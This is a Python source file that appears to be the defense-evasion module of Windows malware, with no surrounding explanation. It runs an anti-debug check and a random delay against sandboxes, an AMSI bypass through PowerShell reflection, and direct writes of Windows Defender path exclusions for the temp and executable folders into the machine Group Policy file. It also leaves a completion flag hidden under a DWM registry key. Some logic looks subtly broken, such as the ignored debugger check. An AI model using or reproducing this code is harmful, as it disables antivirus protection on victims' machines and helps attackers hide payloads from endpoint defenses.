import os
import time
import random
import subprocess
import tempfile
import ctypes


def anti_debug():
    try:
        ctypes.windll.kernel32.IsDebuggerPresent()
    except Exception:
        pass


def delayed_exec():
    delay = random.randint(30, 90)
    time.sleep(delay)


def amsi_bypass():
    try:
        subprocess.run(
            ['powershell', '-Command',
             '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
             '.GetField("amsiInitFailed","NonPublic,Static")'
             '.SetValue($null,$true)'],
            capture_output=True, timeout=10
        )
        return True
    except Exception:
        return False


def write_registry_pol_exclusion(exclude_paths):
    pol_path = r"C:\Windows\System32\GroupPolicy\Machine\registry.pol"
    try:
        if os.path.exists(pol_path):
            with open(pol_path, 'rb') as f:
                data = bytearray(f.read())
        else:
            os.makedirs(os.path.dirname(pol_path), exist_ok=True)
            data = bytearray(b'PReg\x00\x00\x00\x01')

        key = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
        key_enc = key.encode('utf-16-le') + b'\x00\x00'

        for path in exclude_paths:
            if not path:
                continue
            val_enc = path.encode('utf-16-le') + b'\x00\x00'
            typ = (4).to_bytes(4, 'little')
            size = (4).to_bytes(4, 'little')
            data.extend(key_enc + val_enc + typ + size + b'\x00\x00\x00\x00')

        with open(pol_path, 'wb') as f:
            f.write(data)

        subprocess.run(['gpupdate', '/force'], capture_output=True, timeout=60)
        return True
    except Exception:
        return False


def mark_evasion_done():
    try:
        import winreg
        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\DWM"
        )
        winreg.SetValueEx(key, "EvasionDone", 0, winreg.REG_DWORD, 1)
        key.Close()
        return True
    except Exception:
        return False


def is_evasion_done():
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\DWM", 0, winreg.KEY_READ
        )
        value, _ = winreg.QueryValueEx(key, "EvasionDone")
        key.Close()
        return value == 1
    except Exception:
        return False


def run_evasion(exe_path: str):
    if is_evasion_done():
        return True

    anti_debug()
    delayed_exec()

    amsi_bypass()
    exclude_paths = [
        tempfile.gettempdir(),
        os.path.dirname(exe_path) if not exe_path.endswith('.py') else '',
    ]
    write_registry_pol_exclusion(exclude_paths)

    mark_evasion_done()
    return True
